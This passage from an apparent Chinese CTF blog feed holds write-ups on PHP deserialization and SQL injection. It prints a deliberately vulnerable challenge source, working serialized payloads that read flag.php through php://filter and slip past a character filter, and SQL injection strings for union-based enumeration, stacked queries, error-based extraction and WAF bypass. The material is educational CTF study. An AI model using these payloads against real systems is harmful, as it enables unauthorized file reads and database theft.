constant">3A</span><span class="token operator">%</span>22b<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BO</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token constant">22C</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22c<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22flag<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-7-反序列化之深浅拷贝"><a href="#1-2-7-反序列化之深浅拷贝" class="headerlink" title="1.2.7  反序列化之深浅拷贝"></a>1.2.7  反序列化之深浅拷贝</h3><p>题目链接：<a href="http://dcnctf.com:1035/" target="_blank" rel="noopener">http://dcnctf.com:1035/</a></p><p>参考资料：</p><p><strong>1、</strong>PHP深浅拷贝  <a href="https://www.cnblogs.com/nul1/p/9418080.html" target="_blank" rel="noopener">https://www.cnblogs.com/nul1/p/9418080.html</a></p><p><strong>2、</strong>南邮PHP反序列化  <a href="https://www.cnblogs.com/nul1/p/9417484.html" target="_blank" rel="noopener">https://www.cnblogs.com/nul1/p/9417484.html</a></p><p>demo：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token shell-comment comment">#GOAL: get the secret;</span><span class="token keyword">class</span> <span class="token class-name">just4fun</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$enter</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//$this->enter = &amp;$this->secret</span>    <span class="token comment" spellcheck="true">//一个&amp;搞定</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$pass</span><span class="token operator">=</span><span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">secret</span> <span class="token operator">=</span> <span class="token string">"?????????????????????????????"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">secret</span> <span class="token operator">===</span> <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">enter</span><span class="token punctuation">)</span>            <span class="token keyword">echo</span> <span class="token string">"Congratulation! Here is my secret: "</span><span class="token punctuation">.</span><span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">secret</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            <span class="token keyword">echo</span> <span class="token string">"Oh no... You can't fool me"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">echo</span> <span class="token string">"are you trolling?"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2-真题详解"><a href="#2-真题详解" class="headerlink" title="2. 真题详解"></a>2. 真题详解</h1><h2 id="2-1-babyphp（2020新春战疫）"><a href="#2-1-babyphp（2020新春战疫）" class="headerlink" title="2.1 babyphp（2020新春战疫）"></a>2.1 babyphp<code>（2020新春战疫）</code></h2><p>这是一道长度增大逃逸的反序列化题目，先构造pop链，然后利用preg_replace逃逸出pop链对应的序列化值。</p><h2 id="2-2-AreUSerialz（2020网鼎杯第一场青龙组）"><a href="#2-2-AreUSerialz（2020网鼎杯第一场青龙组）" class="headerlink" title="2.2  AreUSerialz（2020网鼎杯第一场青龙组）"></a>2.2  AreUSerialz<code>（2020网鼎杯第一场青龙组）</code></h2><p><strong>参考资料：</strong></p><p><strong>1、</strong>php  – 脚本在魔法方法中失去权限__destruct（）  <a href="https://www.icode9.com/content-1-231317.html" target="_blank" rel="noopener">https://www.icode9.com/content-1-231317.html</a></p><p><strong>2、</strong>Y1ng——  <a href="https://www.gem-love.com/websecurity/2322.html" target="_blank" rel="noopener">https://www.gem-love.com/websecurity/2322.html</a> </p><p><strong>3、</strong>anquanke  <a href="https://www.anquanke.com/post/id/204856#h2-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/204856#h2-3</a></p><p><strong>题目源码：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">{</span><span class="token string">'str'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这道题环境有点问题，打比赛时，本地根据题目提供的源代码搭不起来，下面放一些赛后dai师傅们的讨论情况。</p><p><img src="/2020/04/28/best-phpserialize/12.png" alt="Y1ng"></p><p> <img src="/2020/04/28/best-phpserialize/14.png" alt="Y2ng"></p><p><img src="/2020/04/28/best-phpserialize/13.jpg" alt="flank"> </p><p>记录下一些比赛时一些师傅可用的payload：</p><pre><code>payload1：比赛时用的！！O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:62:&quot;php://filter/convert.base64-encode/resource=/web/html/flag.php&quot;;s:7:&quot;content&quot;;N;}-----------------------------------------------------------------------------------------payload2:省略contentO:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;}-----------------------------------------------------------------------------------------payload3：使用绝对路径O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:18:&quot;/web/html/flag.php&quot;;s:7:&quot;content&quot;;s:4:&quot;y1ng&quot;;}</code></pre><p><strong>关于绝对路径方面：</strong></p><p>y1ng师傅：</p><pre><code>用/proc/selef/cmdline读到配置文件路径：/web/config/httpd.conf然后读到网站根目录为：/web/html/</code></pre><p>另一位师傅:</p><p>构造个404看看这是什么服务器。 发现是 Alpine的镜像。于是查了波其web路径的配置/web/config/httpd.conf </p><p><img src="/2020/04/28/best-phpserialize/12.png" alt="404"></p><p><strong>赛后本地搭建环境，进行测试：</strong></p><p>环境：<strong>php7.3.4</strong></p><p>用<strong>S来代替s</strong>，在小写s情况下<code>\00</code>就会被解析成<code>%00</code>（1个字符），而如果是大写S，<code>\00</code>就是一个斜线+2个零（3个字符）,这样就可以绕过is_valid的检测。</p><p>如果不用绝对路径，可以使用伪协议，并且<strong>省略最后一个}</strong>，file_get_contents就不会返回false了。</p><p>下面摘自Y1ng大佬的解释。</p><p><img src="/2020/04/28/best-phpserialize/15.png" alt="Y3ng"></p><pre><code>以下为本地测试时可用的payload：绝对路径+大写SO:11:&quot;FileHandler&quot;:3:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:30:&quot;/var/www/html/php_exp/flag.php&quot;;S:10:&quot;\00*\00content&quot;;N;}-----------------------------------------------------------------------------------------相对路径+伪协议+大写S+去掉末尾的}O:11:&quot;FileHandler&quot;:3:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;S:10:&quot;\00*\00content&quot;;N;-----------------------------------------------------------------------------------------相对路径+大写S+去掉末尾的}O:11:&quot;FileHandler&quot;:3:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;N;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF_WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>best_sql</title>
      <link href="/2020/04/28/best-sql/"/>
      <url>/2020/04/28/best-sql/</url>
      
        <content type="html"><![CDATA[<h1 id="1-SQL注入基础知识"><a href="#1-SQL注入基础知识" class="headerlink" title="1. SQL注入基础知识"></a>1. SQL注入基础知识</h1><h2 id="1-1-sql天书"><a href="#1-1-sql天书" class="headerlink" title="1.1  sql天书"></a>1.1  sql天书</h2><h3 id="1-1-1-sql操作"><a href="#1-1-1-sql操作" class="headerlink" title="1.1.1  sql操作"></a>1.1.1  sql操作</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>在MySQL数据库中创建一个完整的表  <a href="https://www.cnblogs.com/jondam/p/6259666.html" target="_blank" rel="noopener">https://www.cnblogs.com/jondam/p/6259666.html</a></p><h4 id="1-1-1-1-增"><a href="#1-1-1-1-增" class="headerlink" title="1.1.1.1  增"></a>1.1.1.1  增</h4><h4 id="1-1-1-2-删"><a href="#1-1-1-2-删" class="headerlink" title="1.1.1.2  删"></a>1.1.1.2  删</h4><h4 id="1-1-1-3-查"><a href="#1-1-1-3-查" class="headerlink" title="1.1.1.3  查"></a>1.1.1.3  查</h4><pre class="line-numbers language-mysql"><code class="language-mysql">union select group_concat(table_name) from information_schema.tables where table_schema = database()#union select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = 'user'#union select group_concat(username) from user#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-1-1-4-改"><a href="#1-1-1-4-改" class="headerlink" title="1.1.1.4  改"></a>1.1.1.4  改</h4><p>UPDATE有个特殊的属性在set设置多个相同的键时，只取最后一个键的值。  </p><h2 id="1-2-php和mysql的交互"><a href="#1-2-php和mysql的交互" class="headerlink" title="1.2  php和mysql的交互"></a>1.2  php和mysql的交互</h2><p><strong>参考资料：</strong></p><p><strong>1、</strong>PHP连接MySQL数据库的几种方法  <a href="https://www.cnblogs.com/mz0104/p/11811883.html" target="_blank" rel="noopener">https://www.cnblogs.com/mz0104/p/11811883.html</a></p><h2 id="1-3-sql注入"><a href="#1-3-sql注入" class="headerlink" title="1.3  sql注入"></a>1.3  sql注入</h2><h3 id="1-3-1-宽字节注入"><a href="#1-3-1-宽字节注入" class="headerlink" title="1.3.1  宽字节注入"></a>1.3.1  宽字节注入</h3><p>GBK编码下 <code>addslash()</code> 绕过宽字节绕过 ， <code>%df%27</code> 经addslash后变成<code>%df%5c%27</code>了 。</p><h3 id="1-3-2-堆叠注入"><a href="#1-3-2-堆叠注入" class="headerlink" title="1.3.2  堆叠注入"></a>1.3.2  堆叠注入</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>BUUCTF-Web-随便注(三种解题思路)  <a href="https://www.jianshu.com/p/36f0772f5ce8" target="_blank" rel="noopener">https://www.jianshu.com/p/36f0772f5ce8</a></p><h4 id="1-3-2-1-利用show"><a href="#1-3-2-1-利用show" class="headerlink" title="1.3.2.1  利用show"></a>1.3.2.1  利用show</h4><h4 id="1-3-2-2-利用set-prepare"><a href="#1-3-2-2-利用set-prepare" class="headerlink" title="1.3.2.2   利用set prepare"></a>1.3.2.2   利用set prepare</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token variable">@t</span><span class="token operator">=</span><span class="token punctuation">(</span>sql查询语句<span class="token punctuation">)</span><span class="token punctuation">;</span>prepare x <span class="token keyword">from</span> <span class="token variable">@t</span><span class="token punctuation">;</span><span class="token keyword">execute</span> x<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-3-2-3-利用handler-MySQL-语法结构"><a href="#1-3-2-3-利用handler-MySQL-语法结构" class="headerlink" title="1.3.2.3   利用handler(MySQL) 语法结构"></a>1.3.2.3   利用<code>handler(MySQL)</code> 语法结构</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">OPEN</span> <span class="token punctuation">[</span> <span class="token punctuation">[</span><span class="token keyword">AS</span><span class="token punctuation">]</span> alias<span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> index_name { <span class="token operator">=</span> <span class="token operator">|</span> <span class="token operator">&lt;=</span> <span class="token operator">|</span> <span class="token operator">>=</span> <span class="token operator">|</span> <span class="token operator">&lt;</span> <span class="token operator">|</span> <span class="token operator">></span> } <span class="token punctuation">(</span>value1<span class="token punctuation">,</span>value2<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> index_name { <span class="token keyword">FIRST</span> <span class="token operator">|</span> <span class="token keyword">NEXT</span> <span class="token operator">|</span> <span class="token keyword">PREV</span> <span class="token operator">|</span> <span class="token keyword">LAST</span> }    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> { <span class="token keyword">FIRST</span> <span class="token operator">|</span> <span class="token keyword">NEXT</span> }    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">CLOSE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Example:</strong> </p><pre><code>handler &lt;tablename&gt; open as &lt;handlername&gt;; #指定数据表进行载入并将返回句柄重命名handler &lt;handlername&gt; read first; #读取指定表/句柄的首行数据handler &lt;handlername&gt; read next; #读取指定表/句柄的下一行数据...handler &lt;handlername&gt; close; #关闭句柄</code></pre><h3 id="1-3-3-报错注入"><a href="#1-3-3-报错注入" class="headerlink" title="1.3.3  报错注入"></a>1.3.3  报错注入</h3><ul><li><code>updatexml(1,concat(1,()),1)</code></li><li><code>extractvalue(1,concat(1,))</code></li></ul><pre><code>mysql&gt; select (extractvalue(1,user()));ERROR 1105 (HY000): XPATH syntax error: &#39;@localhost&#39;mysql&gt; select (extractvalue(1,1));+---------------------+| (extractvalue(1,1)) |+---------------------+| 1                   |+---------------------+1 row in set (0.03 sec)</code></pre><h3 id="1-3-4-正则注入"><a href="#1-3-4-正则注入" class="headerlink" title="1.3.4  正则注入"></a>1.3.4  正则注入</h3><pre><code>mysql&gt; select ((select xm from name limit 0,1) regexp &quot;^o&quot;);</code></pre><h2 id="1-4-Sqlite"><a href="#1-4-Sqlite" class="headerlink" title="1.4  Sqlite"></a>1.4  Sqlite</h2><p><strong>参考资料：</strong></p><p>1、<a href="https://ctf.ieki.xyz/library/sqli.html" target="_blank" rel="noopener">https://ctf.ieki.xyz/library/sqli.html</a></p><h2 id="1-5-SQLMAP"><a href="#1-5-SQLMAP" class="headerlink" title="1.5  SQLMAP"></a>1.5  SQLMAP</h2><h1 id="2-SQL注入绕waf总结"><a href="#2-SQL注入绕waf总结" class="headerlink" title="2. SQL注入绕waf总结"></a>2. SQL注入绕waf总结</h1><h2 id="2-1-一些绕过技巧"><a href="#2-1-一些绕过技巧" class="headerlink" title="2.1  一些绕过技巧"></a>2.1  一些绕过技巧</h2><h3 id="2-1-1-替代函数"><a href="#2-1-1-替代函数" class="headerlink" title="2.1.1  替代函数"></a>2.1.1  替代函数</h3><p><strong>字符串连接函数</strong></p><pre><code>concat(str1,str2,str3...)，中间只要字符串有一个为null，最终结果也为NULL，注意null和&#39;null&#39;不一样（区别同1和&#39;1&#39;）concat_ws(&#39;指定分隔符&#39;,str1,str2,str3...)，它会自动忽略中间的空值。如果分隔符为null，整体会返回为空。group_concat(file_name1,file_name2，file_name3...)</code></pre><p><strong>字符串截取函数</strong></p><pre><code>substring(要截取的字符串,从什么地方开始截取,截取多长)substr(要截取的字符串,从什么地方开始截取,截取多长)mid(要截取的字符串,从什么地方开始截取,截取多长)left(str,3)从左往右截取3个字符,左截取right(str,3)从右往左截取3个字符,右截取right(left(,2),2)  left配合right可以实现字符串的截取</code></pre><p><strong>pay attention：</strong></p><p>截取的起始位置不要从0开始！！！</p><pre class="line-numbers language-mysql"><code class="language-mysql">mysql> select (substr((select database()),0,5));+-----------------------------------+| (substr((select database()),0,5)) |+-----------------------------------+|                                   |+-----------------------------------+1 row in set (0.00 sec)mysql> select (substr((select database()),1,5));+-----------------------------------+| (substr((select database()),1,5)) |+-----------------------------------+| first                             |+-----------------------------------+1 row in set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>使用字符串填充函数来替代截取</strong>（使用时就让len小于str的长度，从而达到截取目的）</p><pre><code>lpad(str,len,padstr)用字符串 padstr对 str进行左边填补直至它的长度达到 len个字符长度，然后返回 str。如果 str的长度长于 len&#39;，那么它将被截除到 